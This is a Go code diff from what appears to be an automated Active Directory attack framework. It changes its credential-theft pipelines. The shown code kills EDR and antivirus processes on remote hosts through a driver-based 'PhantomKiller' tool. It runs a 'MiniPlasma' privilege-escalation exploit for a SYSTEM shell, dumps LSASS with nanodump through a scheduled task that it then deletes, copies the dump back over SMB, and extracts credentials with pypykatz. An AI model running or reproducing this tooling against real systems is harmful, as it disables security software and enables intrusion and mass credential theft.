@@ -281,10 +281,7 @@ func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline Pipel
 	}
 
 	ncfg := tools.NanodumpConfig{
-		Binary:   "nanodump",
-		Output:   fmt.Sprintf("/tmp/lsass_%d.dmp", time.Now().Unix()),
-		Fork:     true,
-		Snapshot: false,
+		Output: fmt.Sprintf("/tmp/lsass_%d.dmp", time.Now().Unix()),
 	}
 
 	ctx := context.Background()
@@ -465,7 +462,7 @@ func executeBYOVDPipeline(state *core.ADState, host core.Host, pipeline Pipeline
 	return result
 }
 
-func runDefenderKill(state *core.ADState, host core.Host, target tools.NetExecTarget) {
+func runDefenderKill(_ *core.ADState, _ core.Host, target tools.NetExecTarget) {
 	if !tools.UnDefend.Available() {
 		fmt.Println("[!] UnDefend.exe not found locally, skipping Defender kill")
 		return
@@ -867,11 +864,25 @@ func executePhantomKillerPipeline(state *core.ADState, host core.Host, pipeline 
 	}
 
 	fmt.Println("[*] PhantomKiller: Enumerating EDR processes...")
-	edrPids := []string{"MsMpEng.exe", "CSFalconService.exe", "SentinelService.exe", "CylanceSvc.exe",
+	edrProcs := []string{"MsMpEng.exe", "CSFalconService.exe", "SentinelService.exe", "CylanceSvc.exe",
 		"SophosMgr.exe", "TaniumClient.exe", "CarbonBlack.exe", "CrowdStrike.exe", "McAfee.exe", "Symantec.exe"}
-	for _, proc := range edrPids {
-		killCmd := fmt.Sprintf(`tasklist /FI "IMAGENAME eq %s" 2>NUL | find /I "%s" >NUL && C:\Windows\Temp\PhantomKiller.exe`, proc, proc)
-		tools.NetExec.Run(ctx, target, "-x", []string{killCmd})
+	for _, proc := range edrProcs {
+		pidCmd := fmt.Sprintf(`powershell -c "(Get-Process %s -ErrorAction SilentlyContinue).Id"`, proc)
+		pidR, err := tools.NetExec.Run(ctx, target, "-x", []string{pidCmd})
+		if err == nil && pidR.Success && strings.TrimSpace(pidR.Stdout) != "" {
+			pid := strings.TrimSpace(pidR.Stdout)
+			if !isNumeric(pid) {
+				fmt.Printf("[!] PhantomKiller: Invalid PID from remote: %q, skipping\n", pid)
+				continue
+			}
+			fmt.Printf("[*] PhantomKiller: Found %s PID %s, killing via IOCTL...\n", proc, pid)
+			pidInt := 0
+			fmt.Sscanf(pid, "%d", &pidInt)
+			if pidInt > 0 {
+				killR, _ := tools.PhantomKiller.ExecRemote(ctx, target, `C:\Windows\Temp\PhantomKiller.exe`, tools.PhantomKillerModeKill, pidInt)
+				_ = killR
+			}
+		}
 	}
 
 	fmt.Println("[*] PhantomKiller: Dumping LSASS with nanodump...")
@@ -924,14 +935,46 @@ func executeMiniPlasmaPipeline(state *core.ADState, host core.Host, pipeline Pip
 		return result
 	}
 
+	fmt.Println("[*] MiniPlasma: Uploading nanodump.exe for SYSTEM-level dump...")
+	uploadNd, err := tools.NetExec.PutFile(ctx, target, "nanodump.exe", `C:\Windows\Temp\`)
+	if err != nil || !uploadNd.Success {
+		fmt.Println("[!] Failed to upload nanodump.exe, falling back to nanodump pipeline")
+		return executeNanodumpPipeline(state, host, pipeline)
+	}
+
 	fmt.Println("[*] MiniPlasma: Executing Cloud Filter EoP exploit for SYSTEM shell...")
 	execR, err := tools.NetExec.Run(ctx, target, "-x", []string{`C:\Windows\Temp\MiniPlasma.exe`})
 	if err == nil && execR.Success {
-		fmt.Println("[+] MiniPlasma: SYSTEM shell obtained, dumping LSASS...")
-		dump := executeNanodumpPipeline(state, host, pipeline)
-		if dump.Success {
-			result.Evidence = append(result.Evidence, dump.Evidence...)
+		fmt.Println("[+] MiniPlasma: SYSTEM shell obtained, dumping LSASS as SYSTEM...")
+
+		ts := time.Now().Unix()
+		remotePath := fmt.Sprintf(`C:\Windows\Temp\lsass_eop_%d.dmp`, ts)
+		dumpCmd := fmt.Sprintf(
+			`schtasks /create /tn "MiniDump" /tr "C:\Windows\Temp\nanodump.exe --write %s --fork" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn "MiniDump" && ping -n 6 127.0.0.1 >NUL && schtasks /delete /tn "MiniDump" /f`,
+			remotePath)
+		tools.NetExec.Run(ctx, target, "-x", []string{dumpCmd})
+
+		fmt.Println("[*] MiniPlasma: Retrieving SYSTEM-level dump via SMB...")
+		getR, err := tools.NetExec.GetFile(ctx, target, remotePath, "/tmp/")
+		if err == nil && getR.Success {
+			dumpName := fmt.Sprintf("lsass_eop_%d.dmp", ts)
+			localPath := "/tmp/" + dumpName
+			fmt.Println("[*] MiniPlasma: Parsing dump with pypykatz...")
+			pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localPath)
+			if pyr.Success {
+				creds := pipeline.ParseFn(pyr.Stdout)
+				result.Creds = append(result.Creds, creds...)
+				for _, c := range creds {
+					result.Evidence = append(result.Evidence, core.EvidenceEntry{
+						Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+						Source: "miniplasma", Key: c.Username + "@" + c.Domain,
+						Value: c.Secret, Confidence: 0.8, RawOutput: pyr.Stdout,
+						Timestamp: time.Now(),
+					})
+				}
+			}
 		}
+
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
 			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
 			Source: "miniplasma", Key: "eop",
